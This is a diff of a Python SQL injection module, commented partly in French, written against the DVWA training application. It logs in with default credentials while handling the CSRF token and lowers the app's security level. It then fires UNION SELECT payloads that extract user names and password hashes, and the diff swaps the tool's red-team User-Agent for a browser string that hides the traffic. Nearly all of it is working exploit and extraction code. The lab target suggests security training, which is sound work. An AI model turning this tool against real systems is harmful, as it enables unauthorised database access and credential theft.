@@ -1,12 +1,13 @@
 """
-SQL Injection Attack Module
-Performs REAL SQL injection attacks against DVWA with improved data extraction
+SQL Injection Attack Module - VERSION FINALE CORRIGÉE
+Avec gestion CSRF token + parsing correct du format DVWA
 """
 import time
 import requests
 from datetime import datetime
 import re
 from bs4 import BeautifulSoup
+
 
 class SQLInjectionAttack:
     def __init__(self, target, parameters):
@@ -16,7 +17,9 @@ class SQLInjectionAttack:
         self.payloads = parameters.get('payloads', [])
         self.aborted = False
         self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'RedTeam-SQLInjection/1.0'})
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
         self.dvwa_authenticated = False
         self.results = {
             'vulnerabilities_found': [],
@@ -25,39 +28,35 @@ class SQLInjectionAttack:
             'attempts': 0
         }
         
-        # Effective DVWA payloads
         if not self.payloads:
             self.payloads = [
                 "1' OR '1'='1",
                 "1' OR 1=1#",
-                "1' OR 1=1--",
-                "1' UNION SELECT null, concat(first_name,0x0a,last_name) FROM users#",
                 "1' UNION SELECT user, password FROM users#",
-                "' OR '1'='1' #",
-                "1' OR '1'='1' -- ",
-                "1' UNION SELECT null, database()#"
+                "1' UNION SELECT first_name, last_name FROM users#",
+                "1' UNION SELECT user_id, CONCAT(first_name,' ',last_name) FROM users#",
             ]
     
     def execute(self):
         """Execute SQL injection attack"""
         yield {
-            'message': '🚀 Starting REAL SQL Injection attack on DVWA',
+            'message': '🚀 Démarrage SQL Injection (VERSION FINALE)',
             'progress': 0,
             'status': 'initializing',
             'packets_sent': 0
         }
         
-        # Authenticate with DVWA
-        auth_success = self._authenticate_dvwa()
+        # AUTH avec CSRF
+        auth_success = self._authenticate_dvwa_with_csrf()
         if auth_success:
             yield {
-                'message': '🔑 Successfully authenticated with DVWA',
+                'message': '🔓 Session DVWA OK avec CSRF',
                 'progress': 10,
                 'status': 'authenticated'
             }
         else:
             yield {
-                'message': '⚠️ Authentication warning - continuing with attack',
+                'message': '⚠️ Auth échouée - tentative quand même',
                 'progress': 10,
                 'status': 'warning'
             }
@@ -69,14 +68,14 @@ class SQLInjectionAttack:
         
         for i, payload in enumerate(self.payloads):
             if self.aborted:
-                yield {'message': 'Attack aborted', 'status': 'aborted'}
+                yield {'message': 'Attaque interrompue', 'status': 'aborted'}
                 break
             
             attempts += 1
             self.results['attempts'] = attempts
             
             yield {
-                'message': f'💉 Testing payload: {payload[:50]}...',
+                'message': f'💉 Test: {payload[:40]}',
                 'progress': 10 + int((i + 1) / total_payloads * 70),
                 'status': 'testing',
                 'payload': payload,
@@ -84,46 +83,131 @@ class SQLInjectionAttack:
             }
             
             try:
-                # Construct injection URL
+                # URL
                 if '?' in self.target:
                     inject_url = f"{self.target}&id={requests.utils.quote(payload)}&Submit=Submit"
                 else:
                     inject_url = f"{self.target}?id={requests.utils.quote(payload)}&Submit=Submit"
                 
-                # Send attack request
+                # Requête
                 response = self.session.get(inject_url, timeout=5)
                 
-                # Debug: Save response for analysis
-                print(f"\n[DEBUG] Payload: {payload}")
-                print(f"[DEBUG] URL: {inject_url}")
-                print(f"[DEBUG] Response Status: {response.status_code}")
-                print(f"[DEBUG] Response Length: {len(response.text)}")
+                print(f"\n{'='*80}")
+                print(f"🔍 PAYLOAD: {payload}")
+                print(f"Status: {response.status_code}, Longueur: {len(response.text)}")
                 
-                # Analyze response
-                vulnerability_found, extracted_data = self._analyze_response(response, payload)
+                # Parser
+                soup = BeautifulSoup(response.text, 'html.parser')
+                visible_text = soup.get_text()
                 
+                # Compteurs
+                id_count = visible_text.count('ID:')
+                first_name_count = visible_text.count('First name:')
+                surname_count = visible_text.count('Surname:')
+                
+                print(f"📊 ID: {id_count}, First name: {first_name_count}, Surname: {surname_count}")
+                
+                # Vulnérabilité si plusieurs résultats
+                vulnerability_found = False
+                extracted_data = []
+                
+                if id_count > 1 or first_name_count > 1:
+                    vulnerability_found = True
+                    print(f"✅ VULNÉRABILITÉ!")
+                    
+                    # PARSING CORRIGÉ pour format: "ID: 1First name: adminSurname: admin"
+                    # Les données sont COLLÉES sans espaces/retours à la ligne
+                    
+                    # Méthode 1: Regex pour capturer le format collé
+                    pattern = r'ID:\s*(\d+)\s*First name:\s*([^\s]+)\s*Surname:\s*([^\s]+)'
+                    matches = re.findall(pattern, visible_text, re.IGNORECASE)
+                    
+                    for match in matches:
+                        user_id, first_name, surname = match
+                        # Filtrer les labels
+                        if first_name.lower() not in ['first', 'name', 'firstname']:
+                            record = {
+                                'id': user_id.strip(),
+                                'first_name': first_name.strip(),
+                                'surname': surname.strip()
+                            }
+                            extracted_data.append(record)
+                            print(f"  📝 Extrait: ID={user_id}, Nom={first_name} {surname}")
+                    
+                    # Méthode 2: Si regex échoue, parser plus agressivement
+                    if not extracted_data:
+                        # Split par "ID:" puis parser chaque bloc
+                        blocks = visible_text.split('ID:')[1:]  # Skip le premier bloc vide
+                        
+                        for block in blocks:
+                            # Extraire ID
+                            id_match = re.match(r'\s*(\d+)', block)
+                            if not id_match:
+                                continue
+                            user_id = id_match.group(1)
+                            
+                            # Extraire First name
+                            fname_match = re.search(r'First name:\s*([^\s\n]+)', block, re.IGNORECASE)
+                            if not fname_match:
+                                continue
+                            first_name = fname_match.group(1)
+                            
+                            # Extraire Surname
+                            sname_match = re.search(r'Surname:\s*([^\s\n]+)', block, re.IGNORECASE)
+                            if not sname_match:
+                                continue
+                            surname = sname_match.group(1)
+                            
+                            # Filtrer labels
+                            if first_name.lower() not in ['first', 'name', 'firstname', 'surname']:
+                                record = {
+                                    'id': user_id.strip(),
+                                    'first_name': first_name.strip(),
+                                    'surname': surname.strip()
+                                }
+                                extracted_data.append(record)
+                                print(f"  📝 Extrait (méthode 2): {record}")
+                
+                # UNION SELECT avec format différent
+                elif 'union' in payload.lower() and len(response.text) > 3000:
+                    vulnerability_found = True
+                    print(f"✅ UNION SELECT (format alternatif)")
+                    
+                    # Chercher patterns user/password
+                    if 'password' in payload.lower():
+                        # Format: user | hash
+                        lines = visible_text.split('\n')
+                        for line in lines:
+                            # Chercher lignes avec hash MD5 (32 chars hexa)
+                            if re.search(r'[a-f0-9]{32}', line, re.IGNORECASE):
+                                parts = re.split(r'\s+', line.strip())
+                                if len(parts) >= 2:
+                                    extracted_data.append({
+                                        'user': parts[0],
+                                        'password_hash': parts[1]
+                                    })
+                                    print(f"  📝 User/Hash: {parts[0]} | {parts[1][:16]}...")
+                
+                # Enregistrer résultats
                 if vulnerability_found:
-                    vulnerability = {
+                    vuln = {
                         'type': 'SQL Injection',
                         'payload': payload,
                         'parameter': 'id',
                         'severity': 'Critical',
                         'timestamp': datetime.now().isoformat(),
-                        'response_code': response.status_code,
-                        'url': inject_url,
-                        'evidence': f'{len(extracted_data)} records extracted' if extracted_data else 'Multiple rows returned'
+                        'evidence': f'{len(extracted_data)} enregistrements extraits'
                     }
-                    self.results['vulnerabilities_found'].append(vulnerability)
+                    self.results['vulnerabilities_found'].append(vuln)
                     
                     yield {
-                        'message': f'🎯 VULNERABILITY CONFIRMED! Payload worked: {payload[:40]}',
+                        'message': f'🎯 VULNÉRABILITÉ! {len(extracted_data)} enreg.',
                         'progress': 10 + int((i + 1) / total_payloads * 70),
                         'status': 'vulnerability_found',
-                        'vulnerability': vulnerability,
+                        'vulnerability': vuln,
                         'packets_sent': attempts
                     }
                     
-                    # If data was extracted
                     if extracted_data:
                         data_entry = {
                             'type': 'user_credentials',
@@ -136,7 +220,7 @@ class SQLInjectionAttack:
                         self.results['data_extracted'].append(data_entry)
                         
                         yield {
-                            'message': f'📊 DATA EXTRACTED! {len(extracted_data)} user records from DVWA database',
+                            'message': f'📊 {len(extracted_data)} enregistrements extraits de DVWA!',
                             'progress': 10 + int((i + 1) / total_payloads * 70),
                             'status': 'data_extracted',
                             'extracted_data': data_entry,
@@ -144,32 +228,28 @@ class SQLInjectionAttack:
                         }
                         
                         time.sleep(0.8)
+                else:
+                    print(f"❌ Pas de vulnérabilité")
                 
-            except requests.exceptions.Timeout:
-                yield {
-                    'message': f'⏱️ Request timeout',
-                    'progress': 10 + int((i + 1) / total_payloads * 70),
-                    'status': 'timeout',
-                    'packets_sent': attempts
-                }
             except Exception as e:
-                print(f"[DEBUG] Error: {e}")
-                yield {
-                    'message': f'❌ Error: {str(e)[:50]}',
-                    'progress': 10 + int((i + 1) / total_payloads * 70),
-                    'status': 'error',
-                    'packets_sent': attempts
-                }
+                print(f"❌ ERREUR: {e}")
+                import traceback
+                traceback.print_exc()
             
             time.sleep(0.4)
         
-        # Final summary
+        # Résumé
         self.results['success'] = len(self.results['vulnerabilities_found']) > 0
-        
         total_records = sum([len(d['data']) for d in self.results['data_extracted']])
         
+        print(f"\n{'='*80}")
+        print(f"📊 RÉSUMÉ:")
+        print(f"  Vulnérabilités: {len(self.results['vulnerabilities_found'])}")
+        print(f"  Données: {total_records} enregistrements")
+        print(f"{'='*80}\n")
+        
         yield {
-            'message': f'✅ Attack completed. Found {len(self.results["vulnerabilities_found"])} vulnerabilities, extracted {total_records} records',
+            'message': f'✅ Terminé! {len(self.results["vulnerabilities_found"])} vulnérabilités, {total_records} enreg.',
             'progress': 100,
             'status': 'completed',
             'packets_sent': attempts,
@@ -177,187 +257,76 @@ class SQLInjectionAttack:
             'data_extracted_count': total_records
         }
     
-    def _authenticate_dvwa(self):
-        """Authenticate with DVWA"""
+    def _authenticate_dvwa_with_csrf(self):
+        """Authentification DVWA avec gestion du CSRF token"""
         try:
-            # Extract base URL
+            # Extraire base URL
             if '/vulnerabilities/' in self.target:
                 base_url = self.target.split('/vulnerabilities/')[0]
             else:
-                base_url = self.target.rstrip('/')
+                import urllib.parse
+                parsed = urllib.parse.urlparse(self.target)
+                base_url = f"{parsed.scheme}://{parsed.netloc}"
             
-            # Get login page for session
-            self.session.get(f"{base_url}/login.php", timeout=5)
+            print(f"[AUTH] Base URL: {base_url}")
             
-            # Login
+            # 1. GET login page + extraire CSRF token
+            response = self.session.get(f"{base_url}/login.php", timeout=5)
+            print(f"[AUTH] GET login: {response.status_code}")
+            print(f"[AUTH] Cookies: {self.session.cookies.get_dict()}")
+            
+            # Extraire CSRF token
+            soup = BeautifulSoup(response.text, 'html.parser')
+            token_input = soup.find('input', {'name': 'user_token'})
+            csrf_token = token_input['value'] if token_input else None
+            print(f"[AUTH] CSRF token: {csrf_token[:20] if csrf_token else 'Aucun'}...")
+            
+            # 2. POST login AVEC CSRF token
             login_data = {
                 'username': 'admin',
                 'password': 'password',
                 'Login': 'Login'
             }
-            response = self.session.post(f"{base_url}/login.php", data=login_data, timeout=5)
+            if csrf_token:
+                login_data['user_token'] = csrf_token
             
-            # Set security to low
-            self.session.get(f"{base_url}/security.php?security=low&seclev_submit=Submit", timeout=5)
+            response = self.session.post(f"{base_url}/login.php", 
+                                        data=login_data, 
+                                        timeout=5, 
+                                        allow_redirects=True)
+            print(f"[AUTH] POST login: {response.status_code}")
+            print(f"[AUTH] URL finale: {response.url}")
             
-            self.dvwa_authenticated = True
-            print("[DEBUG] DVWA authentication successful")
-            return True
+            # Vérifier connexion
+            if 'logout' in response.text.lower():
+                print(f"[AUTH] ✅ LOGIN RÉUSSI!")
+            else:
+                print(f"[AUTH] ⚠️ Login incertain")
+                return False
+            
+            # 3. Set security LOW
+            response = self.session.get(f"{base_url}/security.php?security=low&seclev_submit=Submit", timeout=5)
+            print(f"[AUTH] Security LOW: {response.status_code}")
+            
+            # 4. Test accès page SQL
+            response = self.session.get(f"{base_url}/vulnerabilities/sqli/", timeout=5)
+            print(f"[AUTH] Test SQL page: {response.status_code}, {len(response.text)} chars")
+            
+            if 'User ID' in response.text or 'Submit' in response.text:
+                print(f"[AUTH] ✅ Accès SQL OK!")
+                return True
+            else:
+                print(f"[AUTH] ❌ Pas d'accès SQL")
+                return False
             
         except Exception as e:
-            print(f"[DEBUG] DVWA authentication failed: {e}")
+            print(f"[AUTH] ❌ Erreur: {e}")
+            import traceback
+            traceback.print_exc()
             return False
     
-    def _analyze_response(self, response, payload):
-        """Analyze response for SQL injection success and extract data - IMPROVED"""
-        html = response.text
-        html_lower = html.lower()
-        
-        # Check for SQL injection success
-        vulnerability_found = False
-        extracted_data = []
-        
-        # Method 1: Count database records (DVWA specific)
-        first_name_count = html_lower.count('first name:')
-        surname_count = html_lower.count('surname:')
-        
-        print(f"[DEBUG] First name count: {first_name_count}, Surname count: {surname_count}")
-        
-        if first_name_count > 1 or surname_count > 1:
-            vulnerability_found = True
-            
-            # Extract actual data using BeautifulSoup
-            extracted_data = self._extract_user_data_improved(html)
-            print(f"[DEBUG] Extracted {len(extracted_data)} users")
-        
-        # Method 2: Check for SQL errors
-        if not vulnerability_found:
-            if any(err in html_lower for err in ['sql', 'mysql', 'syntax error', 'database']):
-                vulnerability_found = True
-                print("[DEBUG] SQL error detected in response")
-        
-        # Method 3: Check for UNION SELECT success
-        if 'union' in payload.lower() and len(html) > 500:
-            vulnerability_found = True
-            if not extracted_data:
-                extracted_data = self._extract_union_data(html)
-            print(f"[DEBUG] UNION injection detected, extracted {len(extracted_data)} items")
-        
-        return vulnerability_found, extracted_data
-    
-    def _extract_user_data_improved(self, html):
-        """Extract user data from DVWA response - IMPROVED with BeautifulSoup"""
-        users = []
-        
-        try:
-            # Try BeautifulSoup parsing first
-            soup = BeautifulSoup(html, 'html.parser')
-            
-            # Find all text content
-            text_content = soup.get_text()
-            
-            # Pattern: ID: X First name: Y Surname: Z
-            pattern = r'ID:\s*(\d+)\s+First name:\s*([^\n]+)\s+Surname:\s*([^\n]+)'
-            matches = re.findall(pattern, text_content, re.IGNORECASE)
-            
-            for match in matches:
-                users.append({
-                    'id': match[0].strip(),
-                    'first_name': match[1].strip(),
-                    'surname': match[2].strip()
-                })
-            
-            print(f"[DEBUG] Regex matches found: {len(matches)}")
-            
-            # If that didn't work, try HTML parsing
-            if not users:
-                # Look for pre or div elements containing results
-                for element in soup.find_all(['pre', 'div', 'p']):
-                    text = element.get_text()
-                    if 'ID:' in text and 'First name:' in text:
-                        lines = text.split('\n')
-                        current_user = {}
-                        
-                        for line in lines:
-                            line = line.strip()
-                            if line.startswith('ID:'):
-                                if current_user:
-                                    users.append(current_user)
-                                current_user = {'id': line.replace('ID:', '').strip()}
-                            elif line.startswith('First name:'):
-                                current_user['first_name'] = line.replace('First name:', '').strip()
-                            elif line.startswith('Surname:'):
-                                current_user['surname'] = line.replace('Surname:', '').strip()
-                        
-                        if current_user and 'first_name' in current_user:
-                            users.append(current_user)
-            
-            # Last resort: regex on raw HTML
-            if not users:
-                pattern = r'ID:\s*(\d+)<br\s*/?>First name:\s*([^<]+)<br\s*/?>Surname:\s*([^<]+)'
-                matches = re.findall(pattern, html, re.IGNORECASE)
-                
-                for match in matches:
-                    users.append({
-                        'id': match[0].strip(),
-                        'first_name': match[1].strip(),
-                        'surname': match[2].strip()
-                    })
-            
-        except Exception as e:
-            print(f"[DEBUG] Extraction error: {e}")
-        
-        return users
-    
-    def _extract_union_data(self, html):
-        """Extract data from UNION SELECT results - IMPROVED"""
-        data = []
-        
-        try:
-            soup = BeautifulSoup(html, 'html.parser')
-            
-            # Look for pre tags containing results
-            for pre in soup.find_all('pre'):
-                text = pre.get_text().strip()
-                if text and len(text) > 2:
-                    # Split by newlines or breaks
-                    lines = text.split('\n')
-                    for line in lines:
-                        line = line.strip()
-                        if line and not line.startswith('ID:') and not line.startswith('First name:'):
-                            # This might be extracted data
-                            if len(line) > 3 and len(line) < 100:
-                                data.append({'extracted_value': line})
-            
-            # Also check divs
-            if not data:
-                for div in soup.find_all('div'):
-                    text = div.get_text().strip()
-                    lines = text.split('\n')
-                    for line in lines:
-                        line = line.strip()
-                        if line and 'first name' not in line.lower() and 'surname' not in line.lower():
-                            if 5 < len(line) < 100:
-                                data.append({'extracted_value': line})
-        
-        except Exception as e:
-            print(f"[DEBUG] Union extraction error: {e}")
-        
-        # Remove duplicates and filter garbage
-        seen = set()
-        filtered_data = []
-        for item in data:
-            val = item['extracted_value']
-            if val not in seen and not val.startswith('<') and not val.startswith('>'):
-                seen.add(val)
-                filtered_data.append(item)
-        
-        return filtered_data[:10]  # Limit to first 10 unique items
-    
     def get_results(self):
-        """Get attack results"""
         return self.results
     
     def abort(self):
-        """Abort the attack"""
         self.aborted = True
